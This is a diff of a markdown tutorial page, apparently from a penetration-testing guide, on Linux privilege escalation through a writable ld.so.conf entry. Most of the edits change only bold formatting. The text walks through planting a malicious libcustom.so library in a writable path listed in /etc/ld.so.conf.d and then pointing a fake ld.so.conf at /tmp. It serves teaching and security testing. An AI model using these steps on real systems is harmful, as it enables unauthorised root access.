@@ -38,14 +38,14 @@ void say_hi()
 {% endtab %}
 {% endtabs %}
 
-1. **Create** those files in your machine in the same folder
-2. **Compile** the **library**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
-3. **Copy **_**** libcustom.so_ to _/usr/lib_: `sudo cp libcustom.so /usr/lib` (root privs)
-4. **Compile** the **executable**: `gcc sharedvuln.c -o sharedvuln -lcustom`
+1. **Create **those files in your machine in the same folder
+2. **Compile **the **library**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
+3. **Copy**_** **libcustom.so _to_ /usr/lib_: `sudo cp libcustom.so /usr/lib` (root privs)
+4. **Compile **the **executable**: `gcc sharedvuln.c -o sharedvuln -lcustom`
 
 ### Check the environment
 
-Check that _libcustom.so_ is being **loaded** from _/usr/lib_ and that you can **execute** the binary.
+Check that _libcustom.so_ is being **loaded **from _/usr/lib_ and that you can **execute **the binary.
 
 ```
 $ ldd sharedvuln
@@ -61,14 +61,14 @@ Hi
 
 ## Exploit
 
-In this scenario we are going to suppose that **someone has created a vulnerable entry** inside a file in _/etc/ld.so.conf/_:
+In this scenario we are going to suppose that **someone has created a vulnerable entry **inside a file in _/etc/ld.so.conf/_:
 
 ```bash
 sudo echo "/home/ubuntu/lib" > /etc/ld.so.conf.d/privesc.conf
 ```
 
 The vulnerable folder is _/home/ubuntu/lib_ (where we have writable access).\
-**Downloadand compile** the following code inside that path:
+**Downloadand compile **the following code inside that path:
 
 ```c
 //gcc -shared -o libcustom.so -fPIC libcustom.c
@@ -85,9 +85,9 @@ void say_hi(){
 }
 ```
 
-Now that we have **created the malicious libcustom library inside the misconfigured** path, we need to wait for a **reboot** or for the root user to execute **`ldconfig`** (_in case you can execute this binary as **sudo** or it has the **suid bit** you will be able to execute it yourself_).
+Now that we have **created the malicious libcustom library inside the misconfigured** path, we need to wait for a **reboot **or for the root user to execute **`ldconfig `**(_in case you can execute this binary as **sudo **or it has the **suid bit **you will be able to execute it yourself_).
 
-Once this has happened **recheck** where is the `sharevuln` executable loading the `libcustom.so` library from:
+Once this has happened **recheck **where is the `sharevuln` executable loading the `libcustom.so` library from:
 
 ```c
 $ldd sharedvuln
@@ -111,10 +111,10 @@ ubuntu
 Note that in this example we haven't escalated privileges, but modifying the commands executed and **waiting for root or other privileged user to execute the vulnerable binary** we will be able to escalate privileges.
 {% endhint %}
 
-### &#x20;Other misconfigurations - Same vuln
+###  Other misconfigurations - Same vuln
 
 In the previous example we faked a misconfiguration where an administrator **set a non-privileged folder inside a configuration file inside `/etc/ld.so.conf.d/`**.\
-But there are other misconfigurations that can cause the same vulnerability, if you have **write permissions** in some **config file** inside `/etc/ld.so.conf.d`s, in the folder `/etc/ld.so.conf.d` or in the file `/etc/ld.so.conf` you can configure the same vulnerability and exploit it.
+But there are other misconfigurations that can cause the same vulnerability, if you have **write permissions **in some **config file **inside `/etc/ld.so.conf.d`s, in the folder `/etc/ld.so.conf.d` or in the file `/etc/ld.so.conf` you can configure the same vulnerability and exploit it.
 
 ## Exploit 2
 
@@ -128,7 +128,7 @@ echo "include /tmp/conf/*" > fake.ld.so.conf
 echo "/tmp" > conf/evil.conf
 ```
 
-Now, as indicated in the **previous exploit**, **create the malicious library inside **_**/tmp**_.\
+Now, as indicated in the **previous exploit**,** create the malicious library inside **_**/tmp**_.\
 And finally, lets load the path and check where is the binary loading the library from:
 
 ```bash
